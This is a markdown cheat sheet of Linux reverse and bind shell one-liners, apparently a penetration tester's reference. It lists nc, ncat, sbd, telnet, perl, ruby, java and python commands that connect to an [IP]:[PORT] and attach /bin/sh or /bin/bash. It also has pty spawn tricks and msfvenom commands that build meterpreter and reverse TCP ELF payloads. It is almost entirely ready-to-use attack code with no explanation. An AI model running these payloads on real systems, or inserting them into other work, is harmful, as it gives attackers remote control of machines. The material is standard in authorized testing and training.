# Linux Shells
___
## nc
##### Listener
```bash
nc -nvlp [PORT] -e /bin/bash
```
##### Shell
```bash
nc [IP] [PORT] -e /bin/bash
```
```bash
rm -f /tmp/p; mknod /tmp/p p && nc [IP] [PORT] 0/tmp/p
```

## ncat
##### Listener
```bash
ncat --exec cmd.exe --allow [IP] -vnl [PORT] --ssl
```
##### Shell
```bash
ncat -nv [IP] [PORT]
```

## sdb
##### Listener
```bash
sbd -lp [PORT] -k secret -e /bin/bash
```
##### Shell
```bash
sbd -k secret [IP] [PORT]
```

## telnet
##### Shell
```bash
rm -f /tmp/f; mkfifo /tmp/f
telnet [IP] [PORT] 0</tmp/f | sh >/tmp/f 2>&1
```
```bash
rm -f /tmp/p; mknod /tmp/p p && telnet [IP] [PORT] 0/tmp/p
```
```bash
telnet [IP] [PORT] | /bin/bash | telnet [IP] [PIPED-PORT]
```

## perl
```perl
perl -e 'use Socket;$i=[RT-IP];$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open([IP],[PORT]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/[IP]/[PORT];cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(([IP],[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

##### Spawn Shell
```python
python -c 'import os; os.system("/bin/sh")'
```
```python
python -c "import pty;pty.spawn('/bin/bash')"
```


## Metasploit
##### Staged reverse TCP
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf -o [NAME].elf
```
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf > [NAME].elf
```

##### Stageless reverse TCP
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf -o [NAME].elf
```

